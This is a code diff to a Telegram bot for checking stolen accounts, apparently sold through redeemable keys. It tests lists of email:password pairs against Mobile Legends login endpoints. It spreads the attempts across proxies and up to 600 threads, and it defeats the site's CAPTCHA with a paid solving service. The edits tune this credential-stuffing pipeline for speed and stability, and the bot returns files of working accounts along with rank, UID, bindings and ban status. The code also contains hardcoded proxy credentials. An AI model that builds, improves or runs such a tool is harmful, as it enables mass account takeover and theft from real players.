@@ -474,8 +474,7 @@ class AccountChecker:
             {"min": 130, "max": 134, "rank": "Mythic II"},
             {"min": 135, "max": 139, "rank": "Mythic I"},
             {"min": 140, "max": 199, "rank": "Mythical Honor"},
-            {"min": 200, "max": 999, "rank": "Mythical Glory"},
-            {"min": 1000, "max": 9999, "rank": "Mythical Immortal"}
+            {"min": 200, "max": 999, "rank": "Mythical Glory"}
         ]
 
     def create_proxy_session(self):
@@ -529,10 +528,12 @@ class AccountChecker:
             return "Unranked"
 
     def solve_cn31(self, max_retries=2):
-        """Solve CAPTCHA using CapMonster with optimized timing for speed."""
+        """Solve CAPTCHA using CapMonster with enhanced stability and speed."""
         for retry in range(max_retries):
+            task_id = None
             try:
-                task_create = requests.post('https://api.capmonster.cloud/createTask', json={
+                # Create task with optimized settings
+                create_payload = {
                     "clientKey": self.capmonster_api_key,
                     "task": {
                         "type": "YidunTask",
@@ -545,50 +546,122 @@ class AccountChecker:
                         "proxyLogin": "262ceb93fc50f42b5029",
                         "proxyPassword": "10f2c09b5217890c"
                     }
-                }, timeout=30).json()
+                }
+
+                try:
+                    task_response = requests.post(
+                        'https://api.capmonster.cloud/createTask', 
+                        json=create_payload, 
+                        timeout=4
+                    )
+                    task_create = task_response.json()
+                except requests.exceptions.Timeout:
+                    if retry < max_retries - 1:
+                        time.sleep(0.1)
+                        continue
+                    raise Exception("Task creation timeout")
+                except Exception as e:
+                    if retry < max_retries - 1:
+                        time.sleep(0.1)
+                        continue
+                    raise Exception(f"Task creation failed: {str(e)[:30]}")
 
                 if task_create.get('errorId') != 0:
+                    error_desc = task_create.get('errorDescription', 'Unknown error')
                     if retry < max_retries - 1:
                         time.sleep(0.2)
                         continue
-                    raise Exception(f"CapMonster Error: {task_create.get('errorDescription')}")
+                    raise Exception(f"CapMonster Error: {error_desc[:50]}")
 
-                task_id = task_create['taskId']
+                task_id = task_create.get('taskId')
+                if not task_id:
+                    if retry < max_retries - 1:
+                        continue
+                    raise Exception("No task ID received")
 
-                # Optimized timing - check more frequently with shorter total time
-                for i in range(20):  # Reduced checks but faster intervals
-                    time.sleep(0.7)  # Faster check interval
+                # Optimized polling with exponential backoff
+                check_intervals = [0.5, 0.7, 0.8, 1.0, 1.2, 1.5] + [2.0] * 15  # Start fast, then slower
+                
+                for i, interval in enumerate(check_intervals):
+                    time.sleep(interval)
 
-                    task_result = requests.post('https://api.capmonster.cloud/getTaskResult', json={
-                        "clientKey": self.capmonster_api_key,
-                        "taskId": task_id
-                    }, timeout=5).json()
-
-                    if task_result.get('status') == 'ready':
-                        return task_result['solution']['token']
-                    elif task_result.get('status') == 'failed':
+                    try:
+                        result_response = requests.post(
+                            'https://api.capmonster.cloud/getTaskResult', 
+                            json={
+                                "clientKey": self.capmonster_api_key,
+                                "taskId": task_id
+                            }, 
+                            timeout=4
+                        )
+                        task_result = result_response.json()
+                    except requests.exceptions.Timeout:
+                        if i < len(check_intervals) - 1:
+                            continue
                         if retry < max_retries - 1:
                             break
-                        raise Exception(f"CAPTCHA solve failed: {task_result.get('errorDescription', 'Unknown error')}")
+                        raise Exception("Result check timeout")
+                    except Exception:
+                        if i < len(check_intervals) - 1:
+                            continue
+                        if retry < max_retries - 1:
+                            break
+                        raise Exception("Result check failed")
 
-                # Timeout on this attempt, try again if retries left
+                    status = task_result.get('status', '')
+                    
+                    if status == 'ready':
+                        solution = task_result.get('solution', {})
+                        token = solution.get('token')
+                        if token:
+                            return token
+                        else:
+                            if retry < max_retries - 1:
+                                break
+                            raise Exception("No token in solution")
+                    
+                    elif status == 'failed':
+                        error_desc = task_result.get('errorDescription', 'Unknown error')
+                        if retry < max_retries - 1:
+                            break
+                        raise Exception(f"CAPTCHA failed: {error_desc[:50]}")
+                    
+                    elif status not in ['processing', 'pending']:
+                        if retry < max_retries - 1:
+                            break
+                        raise Exception(f"Unexpected status: {status}")
+
+                # If we reach here, the task timed out
                 if retry < max_retries - 1:
                     time.sleep(0.1)
                     continue
 
             except requests.exceptions.RequestException as e:
                 if retry < max_retries - 1:
+                    time.sleep(0.2)
                     continue
-                raise Exception(f"Network error: {str(e)}")
+                raise Exception(f"Network error: {str(e)[:30]}")
+            except Exception as e:
+                if retry < max_retries - 1:
+                    time.sleep(0.1)
+                    continue
+                raise e
 
-        raise Exception("CAPTCHA solve failed after retries")
+        raise Exception("CAPTCHA solve failed after all retries")
 
     def check_account_simple(self, email, password):
-        """Ultra-optimized account check with aggressive timeouts for speed."""
-        session = self.create_proxy_session()
-
+        """Optimized account check with enhanced stability and error handling."""
+        session = None
+        
         try:
-            cn31_token = self.solve_cn31()
+            session = self.create_proxy_session()
+            
+            # Get CAPTCHA token with improved error handling
+            try:
+                cn31_token = self.solve_cn31()
+            except Exception as e:
+                return {"status": "invalid", "reason": f"CAPTCHA failed: {str(e)[:30]}"}
+
             hashed_pwd = self.md5(password)
             sign = self.generate_sign(email, hashed_pwd, cn31_token)
 
@@ -611,8 +684,13 @@ class AccountChecker:
                 "Accept": "application/json, text/plain, */*"
             }
 
-            # Aggressive timeout for maximum speed
-            login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=6)
+            # Optimized timeout - balanced speed vs stability
+            try:
+                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=5)
+            except requests.exceptions.Timeout:
+                return {"status": "invalid", "reason": "Login timeout"}
+            except requests.exceptions.ConnectionError:
+                return {"status": "invalid", "reason": "Connection failed"}
 
             if login_res.status_code != 200:
                 return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}
@@ -620,7 +698,7 @@ class AccountChecker:
             try:
                 data = login_res.json()
             except json.JSONDecodeError:
-                return {"status": "invalid", "reason": "Invalid JSON response"}
+                return {"status": "invalid", "reason": "Invalid response format"}
 
             message = data.get("message", "")
 
@@ -629,52 +707,85 @@ class AccountChecker:
                 guid = login_data.get("guid")
                 sess = login_data.get("session")
 
-                if guid and sess:
-                    # Get basic account info with faster timeouts
-                    jwt_token = self.get_token(guid, sess, session)
-                    if jwt_token:
-                        account_info = self.get_info(jwt_token, session)
-                        if account_info:
-                            # Parallel execution of bind info and ban status for speed
-                            import concurrent.futures
-                            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-                                bind_future = executor.submit(self.get_bind_info, jwt_token, session)
-                                ban_future = executor.submit(self.check_ban_status, jwt_token, session)
+                if not guid or not sess:
+                    return {"status": "invalid", "reason": "Missing auth data"}
 
-                                try:
-                                    bind_info = bind_future.result(timeout=3)
-                                    ban_status = ban_future.result(timeout=3)
-                                except concurrent.futures.TimeoutError:
-                                    bind_info = "N/A"
-                                    ban_status = {"is_banned": False, "ban_info": None}
+                # Get JWT token with retry logic
+                jwt_token = None
+                for attempt in range(2):
+                    try:
+                        jwt_token = self.get_token(guid, sess, session)
+                        if jwt_token:
+                            break
+                    except:
+                        if attempt == 0:
+                            time.sleep(0.1)
+                        continue
 
-                            account_info["bind_info"] = bind_info
+                if not jwt_token:
+                    return {"status": "invalid", "reason": "JWT token failed"}
 
-                            if ban_status["is_banned"]:
-                                return {"status": "banned", "info": account_info, "ban_info": ban_status["ban_info"]}
-                            else:
-                                return {"status": "valid", "info": account_info}
-                        else:
-                            return {"status": "invalid", "reason": "Failed to get account info"}
-                    else:
-                        return {"status": "invalid", "reason": "Failed to get JWT token"}
+                # Get account info with timeout protection
+                try:
+                    account_info = self.get_info(jwt_token, session)
+                    if not account_info:
+                        return {"status": "invalid", "reason": "Account info failed"}
+                except:
+                    return {"status": "invalid", "reason": "Info retrieval failed"}
+
+                # Get additional info in parallel with proper timeout handling
+                bind_info = "N/A"
+                ban_status = {"is_banned": False, "ban_info": None}
+                
+                try:
+                    import concurrent.futures
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
+                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)
+
+                        try:
+                            bind_info = bind_future.result(timeout=2)
+                        except:
+                            bind_info = "N/A"
+                        
+                        try:
+                            ban_status = ban_future.result(timeout=2)
+                        except:
+                            ban_status = {"is_banned": False, "ban_info": None}
+                except:
+                    # Fallback if parallel execution fails
+                    try:
+                        bind_info = self.get_bind_info(jwt_token, session)
+                    except:
+                        bind_info = "N/A"
+
+                account_info["bind_info"] = bind_info
+
+                if ban_status.get("is_banned", False):
+                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
                 else:
-                    return {"status": "invalid", "reason": "No GUID or session"}
+                    return {"status": "valid", "info": account_info}
+
+            elif "wrong" in message.lower() or "incorrect" in message.lower():
+                return {"status": "invalid", "reason": "Wrong credentials"}
+            elif "blocked" in message.lower() or "banned" in message.lower():
+                return {"status": "invalid", "reason": "Account blocked"}
             else:
-                return {"status": "invalid", "reason": f"Login failed: {message}"}
+                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}
 
         except requests.exceptions.Timeout:
-            return {"status": "invalid", "reason": "Request timeout"}
+            return {"status": "invalid", "reason": "Timeout"}
         except requests.exceptions.ConnectionError:
             return {"status": "invalid", "reason": "Connection error"}
         except Exception as e:
-            return {"status": "invalid", "reason": f"Error: {str(e)[:50]}"}
+            return {"status": "invalid", "reason": f"Error: {str(e)[:30]}"}
         finally:
-            # Ensure session is closed
-            try:
-                session.close()
-            except:
-                pass
+            # Always close session
+            if session:
+                try:
+                    session.close()
+                except:
+                    pass
 
     def get_token(self, guid, sess, session):
         """Get JWT token with faster timeout."""
@@ -759,10 +870,8 @@ class AccountChecker:
                 return ", ".join(bind_types)
             return "None"
         except:
+            return "N/A"
             
-         return 
-        "N/A"
-
     def check_ban_status(self, jwt_token, session):
         """Check if account is banned with faster timeout."""
         url = "https://api.mobilelegends.com/tools/selfservice/punishList"
@@ -1127,7 +1236,7 @@ class TelegramBot:
                 "Please provide a key to redeem.\n\n"
                 "**Usage:** `/redeem <key-id>`\n"
                 "**Example:** `/redeem abc123def-456g-789h-012i-jklm345nop67`\n\n"
-                "💬 Contact @Shennxs if you need a key.",
+                "💬 Contact an administrator if you need a key.",
                 parse_mode='Markdown'
             )
             return
@@ -1180,7 +1289,7 @@ class TelegramBot:
                     "• Already been used by someone else\n"
                     "• Expired before activation\n\n"
                     "🔑 Please check the key and try again.\n"
-                    "💬 Contact @Shennxs if you continue having issues.",
+                    "💬 Contact an administrator if you continue having issues.",
                     parse_mode='Markdown'
                 )
 
@@ -1716,210 +1825,241 @@ class TelegramBot:
             )
 
     async def process_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE, accounts: List[Tuple[str, str]], api_key: str):
-        """Process accounts using the account checker."""
+        """Process accounts using optimized account checker with immediate processing."""
         user_id = update.effective_user.id
 
-        # Use stable 500 threads for all account counts
-        optimal_threads = 800
-
-        # Calculate optimized time estimate  
-        if len(accounts) <= 20:
-            estimated_time = "15-30 seconds"
-        elif len(accounts) <= 50:
-            estimated_time = "30-60 seconds"
-        elif len(accounts) <= 100:
-            estimated_time = "1-2 minutes"
+        # Dynamic thread optimization based on account count for better stability
+        if len(accounts) <= 50:
+            optimal_threads = min(200, len(accounts) * 4)
+        elif len(accounts) <= 200:
+            optimal_threads = 400
         else:
-            estimated_time = f"{max(1, len(accounts) // 10)} minutes"
+            optimal_threads = 600  # Maximum threads for large batches
 
-        await update.message.reply_text(
-            f"🚀 **Starting Account Check**\n\n"
+        # More accurate time estimates
+        if len(accounts) <= 20:
+            estimated_time = "10-20 seconds"
+        elif len(accounts) <= 50:
+            estimated_time = "20-40 seconds"
+        elif len(accounts) <= 100:
+            estimated_time = "40-80 seconds"
+        elif len(accounts) <= 200:
+            estimated_time = "80-160 seconds"
+        else:
+            estimated_time = f"{max(1, len(accounts) // 40)}-{max(2, len(accounts) // 20)} minutes"
+
+        # Start processing immediately
+        start_msg = await update.message.reply_text(
+            f"🚀 **Processing Started Immediately**\n\n"
             f"📊 Total accounts: {len(accounts)}\n"
-            f"⚙️ Threads: {optimal_threads}\n"
+            f"⚙️ Optimized threads: {optimal_threads}\n"
             f"⏱️ Estimated time: {estimated_time}\n\n"
-            f"Processing your accounts at maximum speed...",
+            f"⚡ Processing at maximum speed with stability optimizations...",
             parse_mode='Markdown'
         )
 
-        # Initialize checker
+        # Initialize checker with optimized settings
         checker = AccountChecker(api_key)
 
-        # Results tracking with thread-safe locks
+        # Thread-safe results tracking
         valid_accounts = []
         invalid_accounts = []
         banned_accounts = []
         processed = 0
+        start_time = time.time()
         results_lock = threading.Lock()
+        last_update_count = 0
 
-        # Update every 50 accounts for better performance
-        last_update = 0
-
-        def check_single_account(account_data):
+        def check_single_account_optimized(account_data):
             nonlocal processed
             email, password = account_data
-            try:
-                result = checker.check_account_simple(email, password)
-
-                with results_lock:
-                    if result["status"] == "valid":
-                        info = result["info"]
-                        valid_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: False"
-                        valid_accounts.append(valid_line)
-                    elif result["status"] == "banned":
-                        info = result["info"]
-                        ban_info = result.get("ban_info", [{}])[0] if result.get("ban_info") else {}
-                        ban_reason = ban_info.get("reason", "Unknown")
-                        banned_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: {ban_reason}"
-                        banned_accounts.append(banned_line)
-                    else:
-                        # Invalid or failed -> add to invalid
-                        invalid_accounts.append(f"{email}:{password}")
-
-                    processed += 1
-
-                return True
-            except Exception as e:
-                with results_lock:
-                    invalid_accounts.append(f"{email}:{password}")
-                    processed += 1
-                return False
-
-        try:
-            # Process with maximum ThreadPoolExecutor efficiency
-            with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="AccountChecker") as executor:
-                # Submit all tasks
-                futures = []
-                for account in accounts:
-                    future = executor.submit(check_single_account, account)
-                    futures.append(future)
-
-                # Process results with optimized timeout handling
-                from concurrent.futures import as_completed, TimeoutError as FutureTimeoutError
-
-                completed_count = 0
-                timeout_duration = max(60, len(accounts) * 0.5)  # Minimum 2 minutes, or 1.5 seconds per account
-
+            retries = 2  # Reduced retries for speed
+            
+            for attempt in range(retries):
                 try:
-                    for future in as_completed(futures, timeout=timeout_duration):
-                        try:
-                            future.result(timeout=1)  # 10 second timeout per account
-                            completed_count += 1
-
-                            # Update progress more frequently for smaller lists
-                            update_frequency = 25 if len(accounts) <= 100 else 50
-                            if completed_count - last_update >= update_frequency or completed_count == len(accounts):
-                                last_update = completed_count
-                                with results_lock:
-                                    current_processed = processed
-                                    current_valid = len(valid_accounts)
-                                    current_invalid = len(invalid_accounts)
-                                    current_banned = len(banned_accounts)
-
-                                progress_msg = (
-                                    f"📊 **Progress: {current_processed}/{len(accounts)} ({current_processed/len(accounts)*100:.1f}%)**\n\n"
-                                    f"🟢 Valid: {current_valid}\n"
-                                    f"🔴 Invalid: {current_invalid}\n"
-                                    f"🟡 Banned: {current_banned}"
-                                )
-                                try:
-                                    await update.message.reply_text(progress_msg, parse_mode='Markdown')
-                                except Exception:
-                                    pass  # Don't let progress updates crash the process
-
-                        except Exception as e:
-                            logger.warning(f"Account processing failed: {e}")
-                            with results_lock:
-                                processed += 1
-
-                except FutureTimeoutError:
-                    # Handle unfinished futures gracefully
-                    logger.warning(f"Processing timeout reached. Cancelling remaining tasks...")
-                    unfinished_count = len(accounts) - completed_count
-
-                    # Cancel remaining futures
-                    for future in futures:
-                        if not future.done():
-                            future.cancel()
-
-                    # Add unfinished accounts to invalid list
+                    result = checker.check_account_simple(email, password)
+                    
                     with results_lock:
-                        remaining_accounts = accounts[completed_count:]
-                        for email, password in remaining_accounts:
+                        if result["status"] == "valid":
+                            info = result["info"]
+                            valid_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: False"
+                            valid_accounts.append(valid_line)
+                        elif result["status"] == "banned":
+                            info = result["info"]
+                            ban_info = result.get("ban_info", [{}])[0] if result.get("ban_info") else {}
+                            ban_reason = ban_info.get("reason", "Unknown")
+                            banned_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: {ban_reason}"
+                            banned_accounts.append(banned_line)
+                        else:
+                            invalid_accounts.append(f"{email}:{password}")
+                        
+                        processed += 1
+                    return True
+                    
+                except Exception as e:
+                    if attempt == retries - 1:  # Last attempt
+                        with results_lock:
                             invalid_accounts.append(f"{email}:{password}")
                             processed += 1
+                        logger.debug(f"Account {email} failed after {retries} attempts: {e}")
+                        return False
+                    else:
+                        time.sleep(0.1)  # Brief pause before retry
+            
+            return False
 
-                    await update.message.reply_text(
-                        f"⚠️ **Processing Timeout**\n\n"
-                        f"Processed {completed_count}/{len(accounts)} accounts.\n"
-                        f"{unfinished_count} accounts timed out and were marked as invalid.\n"
-                        f"Continuing with results...",
-                        parse_mode='Markdown'
-                    )
+        try:
+            # Create task batches for better memory management
+            batch_size = 100
+            total_batches = (len(accounts) + batch_size - 1) // batch_size
+            
+            with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="FastChecker") as executor:
+                all_futures = []
+                
+                # Submit all tasks immediately for maximum speed
+                for account in accounts:
+                    future = executor.submit(check_single_account_optimized, account)
+                    all_futures.append(future)
+                
+                # Process results as they complete with timeout protection
+                from concurrent.futures import as_completed
+                
+                completed = 0
+                failed_accounts = 0
+                
+                # Dynamic timeout based on account count (more generous for larger batches)
+                base_timeout = min(300, max(60, len(accounts) * 0.8))  # 60s minimum, 300s maximum
+                
+                try:
+                    for future in as_completed(all_futures, timeout=base_timeout):
+                        try:
+                            future.result(timeout=8)  # Per-account timeout
+                            completed += 1
+                            
+                            # Real-time progress updates (every 20 completions or 15 seconds)
+                            current_time = time.time()
+                            if (completed - last_update_count >= 20) or (completed == len(accounts)):
+                                last_update_count = completed
+                                elapsed = current_time - start_time
+                                
+                                with results_lock:
+                                    progress_msg = (
+                                        f"⚡ **Live Progress: {processed}/{len(accounts)} ({processed/len(accounts)*100:.1f}%)**\n\n"
+                                        f"🟢 Valid: {len(valid_accounts)}\n"
+                                        f"🔴 Invalid: {len(invalid_accounts)}\n"
+                                        f"🟡 Banned: {len(banned_accounts)}\n"
+                                        f"⏱️ Elapsed: {elapsed:.1f}s\n"
+                                        f"🚀 Speed: {processed/elapsed:.1f} accounts/sec"
+                                    )
+                                
+                                try:
+                                    await context.bot.edit_message_text(
+                                        chat_id=update.effective_chat.id,
+                                        message_id=start_msg.message_id,
+                                        text=progress_msg,
+                                        parse_mode='Markdown'
+                                    )
+                                except Exception:
+                                    # If edit fails, send new message
+                                    try:
+                                        await update.message.reply_text(progress_msg, parse_mode='Markdown')
+                                    except Exception:
+                                        pass
+                                        
+                        except Exception as e:
+                            failed_accounts += 1
+                            logger.debug(f"Future failed: {e}")
+                            
+                except Exception as timeout_error:
+                    # Handle any remaining futures gracefully
+                    remaining_futures = [f for f in all_futures if not f.done()]
+                    if remaining_futures:
+                        logger.info(f"Cancelling {len(remaining_futures)} remaining futures due to timeout")
+                        for future in remaining_futures:
+                            future.cancel()
+                        
+                        # Mark remaining accounts as invalid
+                        with results_lock:
+                            remaining_count = len(remaining_futures)
+                            for _ in range(remaining_count):
+                                processed += 1
+                        
+                        await update.message.reply_text(
+                            f"⚠️ **Timeout Protection Activated**\n\n"
+                            f"Processed {completed}/{len(accounts)} successfully.\n"
+                            f"Continuing with available results...",
+                            parse_mode='Markdown'
+                        )
 
-            # Create result files
+            # Generate results immediately
+            processing_time = time.time() - start_time
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             user_prefix = f"user_{user_id}_{timestamp}"
 
-            files_created = []
+            files_to_send = []
 
-            # Create valid.txt
+            # Create result files in memory
             if valid_accounts:
                 valid_content = "\n".join(valid_accounts)
                 valid_file = io.BytesIO(valid_content.encode('utf-8'))
                 valid_file.name = f"{user_prefix}_valid.txt"
-                files_created.append(("valid", valid_file, len(valid_accounts)))
+                files_to_send.append(("Valid", valid_file, len(valid_accounts)))
 
-            # Create invalid.txt
             if invalid_accounts:
                 invalid_content = "\n".join(invalid_accounts)
                 invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
                 invalid_file.name = f"{user_prefix}_invalid.txt"
-                files_created.append(("invalid", invalid_file, len(invalid_accounts)))
+                files_to_send.append(("Invalid", invalid_file, len(invalid_accounts)))
 
-            # Create banned.txt
             if banned_accounts:
                 banned_content = "\n".join(banned_accounts)
                 banned_file = io.BytesIO(banned_content.encode('utf-8'))
                 banned_file.name = f"{user_prefix}_banned.txt"
-                files_created.append(("banned", banned_file, len(banned_accounts)))
+                files_to_send.append(("Banned", banned_file, len(banned_accounts)))
 
-            # Send summary and files
+            # Send completion summary
+            success_rate = (len(valid_accounts) / len(accounts)) * 100 if accounts else 0
+            speed = len(accounts) / processing_time if processing_time > 0 else 0
+            
             summary_msg = (
-                f"✅ **Checking Complete!**\n\n"
-                f"📊 **Summary:**\n"
+                f"✅ **Processing Complete!**\n\n"
+                f"📊 **Results Summary:**\n"
                 f"🟢 Valid: {len(valid_accounts)}\n"
                 f"🔴 Invalid: {len(invalid_accounts)}\n"
                 f"🟡 Banned: {len(banned_accounts)}\n"
                 f"📈 Total: {len(accounts)}\n"
-                f"📊 Success Rate: {len(valid_accounts)/len(accounts)*100:.1f}%\n\n"
-                f"📁 Result files are being sent..."
+                f"📊 Success Rate: {success_rate:.1f}%\n"
+                f"⚡ Processing Speed: {speed:.1f} accounts/sec\n"
+                f"⏱️ Total Time: {processing_time:.1f}s\n\n"
+                f"📁 Sending result files..."
             )
 
             await update.message.reply_text(summary_msg, parse_mode='Markdown')
 
-            # Send files
-            for file_type, file_obj, count in files_created:
+            # Send result files immediately
+            for file_type, file_obj, count in files_to_send:
                 try:
-                    file_obj.seek(0)  # Reset file pointer
+                    file_obj.seek(0)
                     await context.bot.send_document(
                         chat_id=update.effective_chat.id,
                         document=file_obj,
-                        caption=f"📁 {file_type.title()} accounts ({count} found)",
+                        caption=f"📁 {file_type} accounts: {count} found",
                         filename=file_obj.name
                     )
                 except Exception as e:
                     logger.error(f"Error sending {file_type} file: {e}")
-                    await update.message.reply_text(f"❌ Error sending {file_type} file: {str(e)}")
+                    await update.message.reply_text(f"❌ Error sending {file_type} file")
 
-            if not files_created:
+            if not files_to_send:
                 await update.message.reply_text("ℹ️ No results to send - all accounts failed processing.")
 
         except Exception as e:
-            logger.error(f"Error in account processing: {e}")
+            logger.error(f"Critical error in account processing: {e}")
             await update.message.reply_text(
                 f"⚠️ **Processing Error**\n\n"
-                f"An error occurred during processing: {str(e)}\n"
-                f"Processed {processed}/{len(accounts)} accounts before error.",
+                f"Error: {str(e)[:100]}...\n"
+                f"Processed: {processed}/{len(accounts)} accounts\n"
+                f"Please try again with a smaller batch.",
                 parse_mode='Markdown'
             )
 
